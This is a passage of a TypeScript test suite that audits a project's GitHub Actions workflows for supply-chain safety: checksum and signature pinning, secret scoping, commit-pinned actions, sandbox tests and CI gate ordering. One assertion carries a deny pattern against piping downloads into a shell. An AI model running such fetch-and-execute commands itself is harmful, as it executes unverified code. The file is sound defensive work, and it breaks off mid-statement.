    // The zip is checked against a SHA-256 pinned in the action for the
    // .bun-version release, then against that release's SHASUMS256.txt, and
    // nothing is unpacked or installed before both pass. A .bun-version bump
    // without a new pin row fails here, and the action refuses it too.
    const bunVersion = readRepoFile(".bun-version").trim();
    expect(bunStep).toMatch(new RegExp(
      `\\n {10}${bunVersion.replace(/\./gu, "\\.")}:bun-windows-x64\\) pinned=[0-9a-f]{64} ;;\\n`,
      "u",
    ));
    expect(bunStep).toContain(
      '          *) echo "no pinned SHA-256 for $asset.zip of bun v$version in this action" >&2; exit 1 ;;\n',
    );
    const pinCompare = bunStep.indexOf(
      '        if [ "$actual" != "$pinned" ]; then\n'
        + '          echo "$asset.zip SHA-256 $actual does not match the pinned $pinned" >&2\n'
        + "          exit 1\n",
    );
    const sumsCompare = bunStep.indexOf(
      '        if [ "$actual" != "$expected" ]; then\n'
        + '          echo "$asset.zip SHA-256 $actual does not match the release\'s $expected" >&2\n'
        + "          exit 1\n",
    );
    expect(pinCompare).toBeGreaterThan(-1);
    expect(sumsCompare).toBeGreaterThan(-1);
    for (const install of ["Expand-Archive", 'cp "$work/out/$asset/bun.exe"', '>> "$GITHUB_PATH"']) {
      const at = bunStep.indexOf(install);
      expect(at, `${install} is missing`).toBeGreaterThan(-1);
      expect(Math.max(pinCompare, sumsCompare), `${install} runs before the zip is verified`).toBeLessThan(at);
    }
    const pythonCompare = pythonStep.indexOf(
      '        if [ "$actual" != "$PYTHON_NUPKG_SHA256" ]; then\n'
        + "          echo \"python.$PYTHON_VERSION.nupkg SHA-256 '$actual' does not match the pinned $PYTHON_NUPKG_SHA256\" >&2\n"
        + "          exit 1\n",
    );
    expect(pythonCompare).toBeGreaterThan(-1);
    for (const install of ["Expand-Archive", 'mv "$work/out/tools" "$dest"', '>> "$GITHUB_ENV"']) {
      const at = pythonStep.indexOf(install);
      expect(at, `${install} is missing`).toBeGreaterThan(-1);
      expect(pythonCompare, `${install} runs before the package is verified`).toBeLessThan(at);
    }
    // A Windows path holds backslashes, and sha256sum given one escapes its
    // output with a leading "\\": the digest is read from stdin instead.
    expect(setupBun).toContain('actual="$(sha256sum < "$work/$asset.zip" | awk');
    expect(setupBun).not.toMatch(/sha256sum "/u);

    // node-gyp needs Python during bun install. On Windows the action unpacks
    // the PSF NuGet package under RUNNER_TEMP against a pinned SHA-256 and
    // points only PYTHON at it, before the action returns to bun install;
    // actions/setup-python would run a machine-wide installer and rewrite
    // uninstall registry entries on the owner's machine.
    expect(setupBun).toContain(
      "    - if: runner.os == 'Windows'\n"
        + "      name: Provide Python for node-gyp (Windows)\n",
    );
    expect(setupBun).toMatch(/^ {8}PYTHON_VERSION: 3\.12\.\d+\n {8}PYTHON_NUPKG_SHA256: [0-9a-f]{64}\n/mu);
    expect(setupBun).toContain('"https://api.nuget.org/v3-flatcontainer/python/$PYTHON_VERSION/python.$PYTHON_VERSION.nupkg"');
    expect(setupBun).toContain('if [ "$actual" != "$PYTHON_NUPKG_SHA256" ]; then');
    expect(setupBun).toContain('dest="$RUNNER_TEMP/python-$PYTHON_VERSION"');
    expect(setupBun).toContain('echo "PYTHON=$(cygpath -w "$dest/python.exe")" >> "$GITHUB_ENV"');
    expect(setupBun).not.toMatch(/uses: actions\/setup-python@/u);
    expect(setupBun.indexOf("name: Provide Python for node-gyp (Windows)")).toBeLessThan(
      setupBun.indexOf("name: Verify bun is the job-local pinned build"),
    );
    expect(setupBun).toContain('cp "$work/out/$asset/bun.exe" "$bin/bunx.exe"');
    expect(setupBun).not.toMatch(/\bln -s|ItemType SymbolicLink|mklink/u);
    expect(setupBun).toContain("    - name: Verify bun is the job-local pinned build\n");
    expect(setupBun).toContain("for tool in bun bunx; do");

    // Installer caches stay per OS.
    expect(installers).toContain("key: ${{ runner.os }}-installers-");
    expect(installers).toContain("key: ${{ runner.os }}-uv-");
  });

  it("authorizes the destructive Windows release steps only on the hosted Windows installer job", () => {
    // These steps claim HKCU ave://, install machine-wide and uninstall, so
    // they need a disposable machine. Every job runs on a hosted label (the
    // runner policy above), so the Windows matrix entry is that machine; each
    // authorization is still scoped to it alone.
    const workflows = readdirSync(resolve(root, ".github/workflows")).filter((name) => /\.ya?ml$/u.test(name));
    let authorizations = 0;
    for (const name of workflows) {
      for (const line of readRepoFile(`.github/workflows/${name}`).split("\n")) {
        if (!/AVE_ALLOW_[A-Z_]*(DISPOSABLE|DESTRUCTIVE)[A-Z_]*:/u.test(line)) continue;
        authorizations += 1;
        expect(name).toBe("build-installers.yml");
        expect(line, `${name}: ${line.trim()}`).toMatch(/: \$\{\{ matrix\.target == 'win' && '1' \|\| '' \}\}$/u);
      }
    }
    expect(authorizations).toBe(2);

    const installers = workflowJobs(readRepoFile(".github/workflows/build-installers.yml")).get("installers");
    if (installers === undefined) throw new Error("build-installers.yml has no installers job");
    expect(installers).toMatch(/^ {12}os: windows-2025\n {12}target: win$/mu);
    expect(installers).not.toContain("--skip-windows-installer-smoke");
  });

  it("provides the AWS CLI from a signature-checked official build before any aws call", () => {
    const install = "bash .github/scripts/install-aws-cli.sh";
    const jobs = [
      ["publish-r2", workflowJobs(readRepoFile(".github/workflows/build-installers.yml")).get("publish-r2")],
      ["probe", workflowJobs(readRepoFile(".github/workflows/r2-probe.yml")).get("probe")],
    ] as const;
    for (const [id, body] of jobs) {
      if (body === undefined) throw new Error(`no ${id} job`);
      expect(jobRunCommands(body).filter((command) => command.includes("install-aws-cli")), id).toEqual([install]);
      const at = body.indexOf(install);
      const step = body.slice(body.lastIndexOf("\n      - ", at), body.indexOf("\n      - ", at));
      // No secret is in scope while a downloaded installer runs.
      expect(step, id).not.toContain("secrets.");
      expect(step, id).not.toContain("continue-on-error");
      expect(body.indexOf("uses: actions/checkout@"), id).toBeLessThan(at);
      expect(at, id).toBeLessThan(body.indexOf("aws --version"));
      expect(at, id).toBeLessThan(body.indexOf("secrets."));
    }

    const script = readRepoFile(".github/scripts/install-aws-cli.sh");
    const fingerprint = "FB5DB77FD5C118B80511ADA8A6310ACC4672475C";
    expect(script).toContain(`AWS_CLI_KEY_FINGERPRINT="${fingerprint}"`);
    expect(script).toMatch(/^AWS_CLI_VERSION="2\.\d+\.\d+"$/mu);
    expect(script).toContain('url="https://awscli.amazonaws.com/awscli-exe-linux-${arch}-${AWS_CLI_VERSION}.zip"');
    expect(script).toContain('--output "$work/awscliv2.sig" "$url.sig"');
    expect(script).toContain('gpg --batch --status-fd 1 --verify "$work/awscliv2.sig" "$work/awscliv2.zip"');
    expect(script).toContain("GOODSIG");
    expect(script).toContain("VALIDSIG");
    expect(script).toContain("GNUPGHOME");
    expect(script).toContain('"$work/aws/install" --install-dir "$prefix" --bin-dir "$bin_dir"');
    expect(script).toContain('echo "$bin_dir" >> "$GITHUB_PATH"');
    expect(script.indexOf("--verify")).toBeLessThan(script.indexOf("unzip -q"));
    expect(script).not.toMatch(/\bsudo\b|set -[a-z]*x|\|\s*(ba)?sh\b/u);

    const key = readRepoFile(".github/scripts/aws-cli-team-public-key.asc");
    expect(key.startsWith("-----BEGIN PGP PUBLIC KEY BLOCK-----\n")).toBe(true);
    expect(key.trimEnd().endsWith("-----END PGP PUBLIC KEY BLOCK-----")).toBe(true);
  });

  it("keeps privileged workflows on trusted default-branch events", () => {
    const deploy = readRepoFile(".github/workflows/web-deploy.yml");
    expect(deploy).toContain("repository_dispatch:");
    expect(deploy).not.toContain("workflow_dispatch:");
    expect(deploy).not.toContain("pull_request:");

    const webCi = readRepoFile(".github/workflows/web-ci.yml");
    expect(webCi).not.toContain("CLOUDFLARE_API_TOKEN");
  });

  it("keeps every workflow self-contained: no cross-repository read token", () => {
    // The retired nightly E2E workflow checked out other (since archived)
    // repositories with this token. Verification is app-complete now; a
    // workflow that needs another repository's source is a regression.
    const workflows = readdirSync(resolve(root, ".github/workflows"))
      .filter((name) => /\.ya?ml$/u.test(name));
    expect(workflows.length).toBeGreaterThan(0);
    for (const name of workflows) {
      expect(
        readRepoFile(`.github/workflows/${name}`),
        `${name} reads another repository through AVE_REPO_READ_TOKEN`,
      ).not.toContain("AVE_REPO_READ_TOKEN");
    }
  });

  it("deploys only a digest-bound web export on the protected runner", () => {
    const workflow = readRepoFile(".github/workflows/web-deploy.yml");
    const build = workflow.slice(
      workflow.indexOf("  build:"),
      workflow.indexOf("  deploy:"),
    );
    const deploy = workflow.slice(workflow.indexOf("  deploy:"));

    expect(build).toContain("bun install --frozen-lockfile");
    expect(build).toContain("bun run build");
    expect(build).toContain("bundle.sha256");
    expect(build).toContain("artifact-digest");
    expect(build).not.toContain("environment: web-production");
    expect(build).not.toContain("CLOUDFLARE_API_TOKEN");

    expect(deploy).toContain("environment: web-production");
    expect(deploy).toContain("EXPECTED_BUNDLE_SHA256");
    expect(deploy).toContain("sha256sum -c bundle.sha256");
    expectPinnedAction(deploy, "cloudflare/wrangler-action");
    expect(deploy).toContain('wranglerVersion: "4.114.0"');
    // Ave's site is the static-assets Worker `ave-web` (ave.agent-connector.ai),
    // configured by web/wrangler.jsonc, which travels inside the verified bundle.
    expect(build).toContain("cp web/wrangler.jsonc staged-web/wrangler.jsonc");
    expect(deploy).toContain("EXPECTED_CONFIG_SHA256");
    expect(deploy).toContain("command: deploy --config wrangler.jsonc");
    expect(deploy).not.toContain("pages deploy");
    expect(deploy).not.toContain("actions/checkout");
    expect(deploy).not.toContain("setup-bun");
    expect(deploy).not.toContain("bun install");
    expect(deploy).not.toContain("bun run build");
  });

  it("pins every external workflow action to a reviewed commit SHA", () => {
    const workflowDirectory = resolve(root, ".github/workflows");
    const pins = new Map<string, { revision: string; at: string }>();
    // The repository's own composite actions call external actions too.
    const actionFiles = readdirSync(resolve(root, ".github/actions"))
      .map((entry) => `.github/actions/${entry}/action.yml`);
    expect(actionFiles.length).toBeGreaterThan(0);
    for (const name of [
      ...readdirSync(workflowDirectory).filter((entry) => /\.ya?ml$/u.test(entry))
        .map((entry) => `.github/workflows/${entry}`),
      ...actionFiles,
    ]) {
      const source = readRepoFile(name);
      for (const match of source.matchAll(/uses:\s+([^@\s]+)@([^\s#]+)([^\n]*)/gu)) {
        const [, action, revision, rest] = match;
        if (action.startsWith("./")) continue;
        expect(
          revision,
          `${name}: ${action} must be pinned to an immutable commit`,
        ).toMatch(/^[0-9a-f]{40}$/u);
        expect(
          rest,
          `${name}: ${action}@${revision} must name the version it was reviewed as`,
        ).toMatch(/^\s+#\s+v\d+(?:\.\d+)*\s*$/u);
        // One reviewed commit per action across every workflow, so a bump
        // cannot leave a stale or divergent pin behind.
        const seen = pins.get(action);
        if (seen === undefined) pins.set(action, { revision, at: name });
        else {
          expect(
            revision,
            `${name}: ${action} is pinned differently than in ${seen.at}`,
          ).toBe(seen.revision);
        }
      }
    }
    expect(pins.size).toBeGreaterThan(0);
  });

  it("runs no repository-hygiene gate ahead of a compile or test step", () => {
    const names = workflowFileNames();
    expect(names.length).toBeGreaterThan(0);

    let jobsCarryingGates = 0;
    for (const name of names) {
      const jobs = workflowJobs(readRepoFile(`.github/workflows/${name}`));
      expect(jobs.size, `${name}: no jobs parsed`).toBeGreaterThan(0);
      for (const [id, body] of jobs) {
        // Guard on the split itself. `workflowJobs` recognises a job by a
        // two-space-indented key, which a shell line inside a `run: |` block
        // could in principle imitate; the resulting fragment would carry no
        // steps and the scan below would quietly find nothing in it. Every real
        // job in this directory declares `steps:` or `uses:` at four spaces.
        expect(
          / {4}(steps|uses):/u.test(body),
          `${name}: "${id}" was parsed as a job but declares no steps — ` +
            "the job splitter mis-read this file",
        ).toBe(true);
        const commands = jobRunCommands(body);
        const firstHygiene = firstCommandIndex(commands, REPOSITORY_HYGIENE);
        if (firstHygiene < 0) continue;
        jobsCarryingGates += 1;
        const lastVerification = lastCommandIndex(commands, VERIFIES_THE_CODE);
        if (lastVerification < 0) continue;
        expect(
          firstHygiene,
          `${name}: job "${id}" runs the hygiene gate(s) ` +
            `${matched(commands, REPOSITORY_HYGIENE).join(", ")} before the ` +
            `step \`${commands[lastVerification] as string}\`. A job stops at ` +
            "its first failed step, so a stale manifest there skips the steps " +
            "that verify the code and leaves a red check meaning \"nothing " +
            "was verified\", which is indistinguishable from \"something was " +
            "verified and failed\". Put every hygiene gate after the last " +
            "compile or test step in its job, or in a job of its own — and if " +
            "it moves to a job of its own, read the note on the " +
            "build-and-test test below first.",
        ).toBeGreaterThan(lastVerification);
      }
    }
    // One today: ci.yml's build-and-test. A scan that stopped recognising the
    // gates would otherwise pass by finding nothing to check.
    expect(jobsCarryingGates).toBeGreaterThanOrEqual(1);
  });

  it("runs the native control boundaries in both platform regression jobs", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/ci.yml"));
    for (const job of ["macos-permission-tests", "linux-confinement-tests"]) {
      const commands = jobRunCommands(jobs.get(job) as string);
      const tests = commands.find((command) => command.includes("bun run test --"));
      expect(tests, `${job} has no native regression invocation`).toBeDefined();
      for (const suite of [
        "sandbox-control-writes.integration.test.ts",
        "sandbox-shell-sockets.integration.test.ts",
        "sandbox-git-controls.integration.test.ts",
        "egress-terminal-background.integration.test.ts",
      ]) {
        expect(tests, `${job} omits ${suite}`).toContain(`src/permissions/__tests__/${suite}`);
      }
    }
  });

  it("requires both Windows packaging targets in the cached required CI check", () => {
    const workflow = parseYaml(readRepoFile(".github/workflows/ci.yml")) as {
      jobs: Record<string, { "runs-on": string; env: Record<string, string>; steps: Record<string, unknown>[]; "continue-on-error"?: boolean }>;
    };
    const job = workflow.jobs["build-and-test"]!;
    expect(job["runs-on"]).toBe("ubuntu-24.04-arm");
    expect(job["continue-on-error"]).not.toBe(true);
    const command = "bun run check:mxc-pins && bun run check:mxc-packaging";
    const step = job.steps.find((entry) => entry.run === command)!;
    expect(step).toBeDefined();
    expect(step["continue-on-error"]).not.toBe(true);
    expect(step.if).toBe("needs.build.outputs.docs_only != 'true'");
    expect(step["working-directory"]).toBe("ave");
    expect(job.env.ELECTRON_CACHE).toBe("${{ github.workspace }}/.cache/electron-win");
    const cache = job.steps.find((entry) => entry.name === "Cache Windows runtime archives")!;
    expect(cache).toBeDefined();
    expect(cache.uses).toMatch(/^actions\/cache@/);
    expect(cache.with).toMatchObject({ path: ".cache/electron-win", key: "ci-win-electron-${{ hashFiles('ave/bun.lock') }}" });
    expect(job.steps.indexOf(cache)).toBeLessThan(job.steps.indexOf(step));
  });

  it("keeps ci.yml's hygiene gates inside the required build-and-test check", () => {
    const jobs = workflowJobs(readRepoFile(".github/workflows/ci.yml"));
    const verification = jobs.get("build-and-test");
    expect(verification, "ci.yml lost its build-and-test job").toBeDefined();
    const commands = jobRunCommands(verification as string);
    const build = jobs.get("build");
    const shards = jobs.get("vitest");
    expect(build, "ci.yml lost its build job").toBeDefined();
    expect(shards, "ci.yml lost its vitest shard job").toBeDefined();

    // build-and-test reports the build job and every Vitest shard: it needs
    // both, still runs when one failed or the run was cancelled (a skipped
    // job reports success to branch protection), and its first step, which
    // a cancellation cannot skip either, fails unless both succeeded.
    // The hygiene gates follow it, so they run after every verification step
    // has reported, as the ordering scan above requires within one job.
    const body = verification as string;
    expect(body).toMatch(/^ {4}needs: \[build, vitest\]$/mu);
    expect(body).toMatch(/^ {4}if: always\(\)$/mu);
    expect(body).not.toContain("cancelled()");
    expect(body).toContain("      - name: Require the build and every Vitest shard\n        if: always()\n");
    const results = commands[0] as string;
    expect(results).toContain('if [ "$BUILD_RESULT" != "success" ]; then');
    expect(results).toContain('if [ "$VITEST_RESULT" != "success" ]; then');
    expect(results).toContain('if [ "$VITEST_RESULT" != "skipped" ]; then');
    expect(body).toContain("BUILD_RESULT: ${{ needs.build.result }}");
    expect(body).toContain("VITEST_RESULT: ${{ needs.vitest.result }}");
    expect(matched(commands, VERIFIES_THE_CODE)).toEqual(["check:mxc-packaging", "check:mxc-pins"]);
    expect(shards).toMatch(/^ {4}needs: build$/mu);
    expect(shards).toContain("        shard: ${{ fromJSON(needs.build.outputs.shards || '[1]') }}");
    expect(shards).toContain("          AVE_CI_SHARD: ${{ matrix.shard }}/${{ strategy.job-total }}");

    // `build-and-test` is one of the two required status checks on `main`; the
    // other is `naming-gate`. Read the current list with
    //   gh api repos/ken-jo/ave/branches/main/protection \
    //     --jq .required_status_checks.contexts
    // A gate moved into a job of its own reports under a check name that list
    // does not contain, and an unlisted check cannot block a merge. That was
    // measured, not feared: with these three in a separate `repo-hygiene` job,
    // a commit carrying a deliberately stale manifest entry had both required
    // contexts reporting success, and the checks that did go red on it reported
    // under names the required list does not contain.
    // Splitting them out is the better shape — it takes a change that adds the
    // new job's check name to that list at the same time.
    expect(
      matched(commands, REPOSITORY_HYGIENE),
      "ci.yml's build-and-test must run every core hygiene gate: it carries a " +
        "required check name, and a gate outside it stops blocking merges",
    ).toEqual([
      "test:knip-gate",
      "check:gate-core",
    ]);

    // Sorted, because VERIFIES_THE_CODE is sorted and `matched` returns marker
    // order — this pins the set, not the step order. The step order is pinned
    // by the ordering scan above. A2A verification is part of the vitest suite
    // that `test:ci` runs; there is no separate evidence step. `test:ci`
    // (scripts/run-ci-suite.mjs) runs `check:test-coverage`'s gate on every
    // full run and the affected tests on a traceable pull request.
    expect(matched(jobRunCommands(build as string), VERIFIES_THE_CODE)).toEqual([
      "bun run build",
      "bun run typecheck",
      "check:typecheck-tests",
      "check:typecheck-tests:self-test",
    ]);
    expect(matched(jobRunCommands(shards as string), VERIFIES_THE_CODE)).toEqual(["bun run test:ci"]);
    expect(packageScripts["test:ci"]).toBe("node scripts/run-ci-suite.mjs");
    expect(readRepoFile("scripts/run-ci-suite.mjs")).toContain('join("scripts", "run-test-coverage-gate.mjs")');
  });

  // The Vitest shards gate on the build job's docs_only output at job level,
  // so their steps carry no condition of their own; the confinement job
  // classifies the change itself and conditions each step.
  const SHARD_GATE = undefined;
  const DOCS_GATE = "steps.docs-impact.outputs.docs_only != 'true'";

  it.each([
    ["vitest", SHARD_GATE, "bubblewrap socat ripgrep zsh", "bwrap socat rg zsh"],
    ["linux-confinement-tests", DOCS_GATE, "bubblewrap socat ripgrep xvfb bash zsh", "bwrap socat rg xvfb-run bash zsh"],
  ])("uses cached packages and proves the sandbox in %s", (jobId, gate, packages, commands) => {
    const source = readRepoFile(".github/workflows/ci.yml");
    const workflow = parseYaml(source);
    const steps = workflow.jobs[jobId].steps;
    const install = steps.find((step: { uses?: string }) => step.uses === "./ave/.github/actions/linux-packages");
    expect(install).toMatchObject({ with: { packages, commands } });
    expect(install.if).toBe(gate);
    const runtime = steps.filter((step: { name?: string }) => [
      "Allow unprivileged user namespaces", "Prove the sandbox backend",
    ].includes(step.name ?? ""));
    expect(runtime).toHaveLength(2);
    for (const step of runtime) {
      expect(step.if).toBe(gate);
      expect(steps.indexOf(step)).toBeGreaterThan(steps.indexOf(install));
    }
    expect(runtime[0].run).toContain("sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0");
    expect(runtime[1].run).toContain("bwrap --unshare-all --ro-bind / / --dev /dev --proc /proc /bin/true");
    const job = workflowJobs(source).get(jobId) as string;
    expect(jobRunCommands(job).join("\n")).not.toMatch(/apt-get\s+install/u);
    // Native confinement cases run in both lanes, so a lane whose backend
    // cannot start fails instead of skipping them.
    const tests = steps.findIndex((step: { run?: string }) =>
      step.run?.includes(jobId === "vitest" ? "bun run test:ci" : "bun run test --"));
    expect(tests).toBeGreaterThan(steps.indexOf(runtime[1]));
    expect(steps[tests].env?.AVE_REQUIRE_SANDBOX_CASES).toBe("1");
    const mustRun = JSON.parse(readRepoFile("config/ci-must-run-tests.json")) as { groups: Record<string, string[]> };
    expect(mustRun.groups.permissions).toContain("src/permissions/");
  });

  it("gates the Vitest shards on the build job's documentation classification", () => {
    const workflow = parseYaml(readRepoFile(".github/workflows/ci.yml"));
    expect(workflow.jobs.vitest.if).toBe("needs.build.outputs.docs_only != 'true'");
  });

  it.each(["vitest", "linux-confinement-tests"])("installs and saves packages before dependency code in %s", (jobId) => {
    const workflow = parseYaml(readRepoFile(".github/workflows/ci.yml"));
    const steps = workflow.jobs[jobId].steps;
    const install = steps.find((step: { uses?: string }) => step.uses === "./ave/.github/actions/linux-packages");
    expect(install).toBeDefined();
    const dependencySteps = steps.filter((step: { run?: string }) => /\bbun\s+(?:install|run)\b/u.test(step.run ?? ""));
    expect(dependencySteps.length).toBeGreaterThan(0);
    for (const step of dependencySteps) {
      expect(steps.indexOf(step)).toBeGreaterThan(steps.indexOf(install));
    }
  });

  it("caches image-specific package archives and recovers an incomplete cache", () => {
    const action = parseYaml(readRepoFile(".github/actions/linux-packages/action.yml"));
    expect(action.runs.using).toBe("composite");
    const steps = action.runs.steps;
    const prepare = steps.find((step: { id?: string }) => step.id === "prepare");
    expect(prepare.run).toContain('sort -u');
    expect(prepare.run).toContain('sha256sum');
    expect(prepare.run).toContain('${ImageOS:-');
    expect(prepare.run).toContain('${ImageVersion:-');
    expect(prepare.run).toContain('sudo -n true');
    expect(prepare.run).toContain('command -v');
    // apt creates partial/ only under Dir::Cache, so a RUNNER_TEMP archive dir needs it made.
    expect(prepare.run).toContain('mkdir -p "$archives/partial"');
    expect(prepare.run).toContain('archives="$RUNNER_TEMP/linux-packages-$packages_hash"');
    expect(prepare.run).not.toContain("mktemp");
    const cache = steps.find((step: { id?: string }) => step.id === "cache");
    expect(cache.uses).toBe("actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9");
    expect(cache.if).toBe("steps.prepare.outputs.install == 'true'");
    expect(cache.with.path).toBe("${{ steps.prepare.outputs.archives }}/*.deb");
    for (const field of ["runner.os", "runner.arch", "steps.prepare.outputs.image-os", "steps.prepare.outputs.image-version", "steps.prepare.outputs.packages-hash"]) {
      expect(cache.with.key).toContain(`\${{ ${field} }}`);
    }
    expect(cache.with["restore-keys"]).toBeUndefined();
    const hit = steps.find((step: { id?: string }) => step.id === "install-cache");
    expect(hit.if).toContain("steps.cache.outputs.cache-hit == 'true'");
    expect(hit.run).toContain('sudo dpkg -i');
    expect(hit.run).not.toContain("apt-get");
    expect(hit.run).toContain('installed=true');
    const miss = steps.find((step: { id?: string }) => step.id === "download-install");
    expect(miss.if).toContain("steps.install-cache.outputs.installed != 'true'");
    expect(miss.run.match(/apt-get update/gu)).toHaveLength(1);
    expect(miss.run).toContain("--download-only");
    expect(miss.run).toContain("--fix-broken");
    expect(miss.run).toContain('Dir::Cache::archives=');
    expect(miss.run).toContain('sudo dpkg -i');
    expect(miss.env.ARCHIVES).toBe("${{ steps.prepare.outputs.archives }}");
  });

  it("saves package archives immediately after installation before returning to the caller", () => {
    const action = parseYaml(readRepoFile(".github/actions/linux-packages/action.yml"));
    const steps = action.runs.steps;
    const cacheSteps = steps.filter((step: { uses?: string }) => step.uses?.startsWith("actions/cache"));
    expect(cacheSteps.map((step: { uses: string }) => step.uses)).toEqual([
      "actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9",
      "actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9",
    ]);
    expect(steps.some((step: { uses?: string }) => step.uses?.startsWith("actions/cache@"))).toBe(false);
    const installIndex = steps.findIndex((step: { id?: string }) => step.id === "download-install");
    expect(installIndex).toBeGreaterThanOrEqual(0);
    expect(steps[installIndex].run).toContain('sudo dpkg -i "${archives[@]}"');
    const save = steps[installIndex + 1];
    expect(save.uses).toBe(cacheSteps[1].uses);
    expect(save.if).toBe("steps.prepare.outputs.install == 'true' && steps.cache.outputs.cache-hit != 'true'");
    expect(save["continue-on-error"]).toBe(true);
    expect(save.with.key).toBe(cacheSteps[0].with.key);
    expect(save.with.path).toBe(cacheSteps[0].with.path);
  });

  it("clears stale package archives before downloading replacements", () => {
    const action = parseYaml(readRepoFile(".github/actions/linux-packages/action.yml"));
    const miss = action.runs.steps.find((step: { id?: string }) => step.id === "download-install");
    const cleanup = 'find "$ARCHIVES" -maxdepth 1 -type f -name \'*.deb\' -delete';
    expect(miss.run.trimStart().startsWith(cleanup)).toBe(true);
    expect(miss.run.indexOf(cleanup)).toBeLessThan(miss.run.indexOf("sudo apt-get install"));
  });

  it("derives missing image identity from the operating system and installed package set", () => {
    const source = readRepoFile(".github/actions/linux-packages/action.yml");
    const action = parseYaml(source);
    const prepare = action.runs.steps.find((step: { id?: string }) => step.id === "prepare");
    expect(source).not.toContain("unknown");
    expect(prepare.run).toContain('image_os=${ImageOS:-}');
    expect(prepare.run).toContain('image_version=${ImageVersion:-}');
    expect(prepare.run).toContain('if [ -z "$image_os" ] || [ -z "$image_version" ]; then');
    expect(prepare.run).toContain('image_os=installed');
    expect(prepare.run).toContain('image_version=$({ cat /etc/os-release; LC_ALL=C dpkg-query -W; } | sha256sum | cut -d \' \' -f 1)');
    expect(prepare.run).toContain('echo "image-os=$image_os"');
    expect(prepare.run).toContain('echo "image-version=$image_version"');
  });

  it("requires shared temporary write regressions in the Linux confinement job", () => {
    const job = workflowJobs(readRepoFile(".github/workflows/ci.yml")).get("linux-confinement-tests");
    const step = job?.split(/^ {6}- /mu).find((body) => body.startsWith("name: Run Linux confinement regressions\n"));
    expect(step).toBeDefined();
    expect(step).toMatch(/^ {10}AVE_REQUIRE_SANDBOX_CASES: "1"$/mu);
    const commands = jobRunCommands(step as string);
    expect(commands).toHaveLength(1);
    expect(commands[0]).toMatch(/^bun run test --\s/u);
    expect(commands[0]?.split(/\s+/u)).toEqual(expect.arrayContaining([
      "src/permissions/__tests__/linux-sandbox-wrap.test.ts",
      "src/permissions/__tests__/asrt-sandbox.test.ts",
    ]));
  });

  it("keeps check:gate-core in step with its callers", () => {
    const body = packageScripts[HYGIENE_COMPOSITE.script];
    expect(body, `package.json has no "${HYGIENE_COMPOSITE.script}" script`).toBeDefined();
    for (const member of HYGIENE_COMPOSITE.members) {
      expect(
        mentions(body as string, member),
        `${HYGIENE_COMPOSITE.script} no longer runs ${member}`,
      ).toBe(true);
      expect(HYGIENE_SCRIPTS.has(member), `${member} is not a listed hygiene gate`).toBe(true);
    }
    // Both callers, by name: a caller that re-lists the members instead is
    // the drift the composite exists to end.
    expect(readRepoFile("scripts/hooks/run-local-checks.mjs")).toContain(
      `["${HYGIENE_COMPOSITE.script}"]`,
    );
    const ci = jobRunCommands(
      workflowJobs(readRepoFile(".github/workflows/ci.yml")).get("build-and-test") as string,
    );
    expect(matched(ci, [HYGIENE_COMPOSITE.script])).toEqual([HYGIENE_COMPOSITE.script]);
    expect(matched(ci, [...HYGIENE_COMPOSITE.members])).toEqual([]);
  });

  it("keeps each hygiene gate's two spellings in step with package.json", () => {
    for (const { script, file } of HYGIENE_GATES) {
      const body = packageScripts[script];
      expect(body, `package.json has no "${script}" script`).toBeDefined();
      expect(
        mentions(body as string, file),
        `"${script}" no longer runs ${file}; the workflow scan would stop ` +
          "recognising this gate under its file-name spelling",
      ).toBe(true);
    }
  });

  it("keeps the verification list in step with package.json", () => {
    // The same cross-check the hygiene list gets, on the other side of the
    // ordering invariant. Both sides are load-bearing: a gate the scan cannot
    // see is a gate it will not police, and a verification step the scan
    // cannot see is a step a gate may legally precede.
    for (const { script, file } of VERIFICATION_CHECKS) {
      const body = packageScripts[script];
      expect(body, `package.json has no "${script}" script`).toBeDefined();
      expect(
        mentions(body as string, file),
        `"${script}" no longer runs ${file}; the workflow scan would stop ` +
          "recognising this step under its file-name spelling",
      ).toBe(true);
    }

    // Totality over package.json for the derived half. This is what a hand
    // list could not give: before the derivation, thirteen names stood against
    // twenty-six scripts of this shape and left twenty of them unseen.
    // The floor guards the derivation itself — a shape regex that stopped
    // matching would otherwise make the loop below pass vacuously.
    const shaped = Object.keys(packageScripts).filter((name) =>
      VERIFICATION_SCRIPT_SHAPE.test(name)
    );
    expect(shaped.length).toBeGreaterThan(20);
    for (const name of shaped) {
      if (HYGIENE_SCRIPTS.has(name)) continue;
      expect(
        matched([`bun run ${name}`], VERIFIES_THE_CODE),
        `package.json defines "${name}", which compiles or tests, and the ` +
          "workflow scan does not recognise it",
      ).not.toEqual([]);
    }

    // The two spellings a certification run used to walk a verification step
    // past a hygiene gate while this file still reported 23 passing tests.
    // Subsumed by the loop above; kept because they are the reproduction.
    for (const command of ["bun run test:coverage", "bun run build:main"]) {
      expect(matched([command], VERIFIES_THE_CODE), command).not.toEqual([]);
    }
  });

  it("keeps every core hygiene gate out of the `build` composite", () => {
    // `bun run build` is one workflow step and fifteen commands, so the
    // workflow scan above — which reads steps — cannot see inside it. A gate
    // placed there fails ci.yml's build step and skips every step after it,
    // the whole suite included: the defect this file exists to keep out of
    // workflows, one layer down. `check:sunset-inventory` was the first
    // command of this composite until the change that added this assertion.
    const build = packageScripts["build"];
    expect(build, "package.json has no build script").toBeDefined();
    const commands = (build as string).split("&&").map((part) => part.trim());
    const inside = HYGIENE_GATES.filter(({ script, file }) =>
      commands.some(
        (command) => mentions(command, script) || mentions(command, file),
      )
    ).map(({ script }) => script);
    expect(
      inside,
      "package.json's `build` script runs a hygiene gate. A job's build step " +
        "stops at that gate, so a stale ledger skips the steps that verify " +
        "the code. Run it as its own step, after the last compile or test " +
        "step in the job.",
    ).toEqual([]);
  });

  it("pins the checks that remain inside the `build` composite", () => {
    // The residual, recorded rather than claimed away. These are not hygiene
    // gates by the list above, but each can still fail ci.yml's build step and
    // skip the suite behind it. They stay because each reads either the
    // sources being compiled or the bytes the build itself just wrote, and a
    // local `bun run build` is where that drift has to surface. The protocol
    // schema check is the first kind: it regenerates from the contract and
    // wire sources the build compiles, and compares against the copy
    // committed beside them. Pinned as an exact list so a check added to
    // `build` fails here and has to be argued for, and so the count in
    // ci.yml's comment beside the trailing gates cannot drift away from the
    // composite it describes.
    const commands = (packageScripts["build"] as string)
      .split("&&")
      .map((part) => part.trim());
    const assertions = commands.filter((command) =>
